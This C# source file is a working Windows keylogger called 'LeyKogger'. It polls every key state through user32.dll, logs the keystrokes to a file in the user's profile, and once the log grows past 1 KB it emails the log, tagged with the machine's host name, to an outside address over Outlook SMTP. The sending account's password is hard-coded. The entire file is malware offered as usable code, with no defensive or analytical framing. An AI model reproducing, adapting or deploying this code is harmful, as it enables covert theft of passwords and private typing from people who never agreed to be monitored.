using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace LeyKogger
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
        private static List<Keys> keys = new();
        private static string buffer = "";
        private static bool shift;
        private static bool caps;

        private static void Initiate()
        {
            if (!File.Exists(path))
                File.Create(path);
            if (!File.Exists(path + ".archive"))
                File.Create(path + ".archive");
        }

        private static void ReadKeyboard()
        {
            for (short x = 0; x < 256; ++x)
                if (GetAsyncKeyState(x) != 0)
                    keys.Add((Keys)x);
        }

        private static async Task<bool> AppendText()
        {
            try
            {
                await File.AppendAllTextAsync(path, buffer);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static async Task<string> ReadText()
        {
            return await File.ReadAllTextAsync(path);            
        }

        private static async Task WriteText()
        {
            await File.WriteAllTextAsync(path, DateTime.Now.ToString());
        }

        private static async Task<int> BytesCount()
        {
            try
            {
                return (await File.ReadAllBytesAsync(path)).Length;
            }
            catch
            {
                return 0;
            }
        }

        static async Task Main()
        {
            Initiate();          

            while (true)
            {                
                ReadKeyboard();

                foreach (Keys key in keys)
                {
                    if (key == Keys.Space) { buffer += " "; continue; }
                    if (key == Keys.Enter) { buffer += "¶"; continue; }
                    if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) continue;

                    buffer += key.ToString();
                }

                if (buffer.Length > 0)
                    if (await AppendText())
                    {
                        buffer = "";
                        keys.Clear();
                        if (await BytesCount() > 1 * 1024) //256KB
                        {
                            await SendMailAsync();
                            if (File.Exists(path + ".archive"))
                                File.SetAttributes(path + ".archive", FileAttributes.Normal);
                            await File.AppendAllTextAsync(path + ".archive", path);
                            File.SetAttributes(path, FileAttributes.Normal);
                            await File.WriteAllTextAsync(path, buffer);
                        }
                    }
                Thread.Sleep(100);
            }
        }

        private static async Task SendMailAsync()
        {
            if (File.Exists(path + ".att"))
                File.SetAttributes(path + ".att", FileAttributes.Normal);
            File.Copy(path, path + ".att", true);
            MailMessage message = new MailMessage("leykogger@outlook.com", "mbarycki@uni.opole.pl");
            message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
            message.Attachments.Add(new Attachment(path + ".att"));
            using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
            {
                client.EnableSsl = true;
                client.Port = 587;
                client.Timeout = 5000;
                client.Credentials = new NetworkCredential("leykogger@outlook.com", "Key-Logger");
                await client.SendMailAsync(message);
            }
        }
    }
}
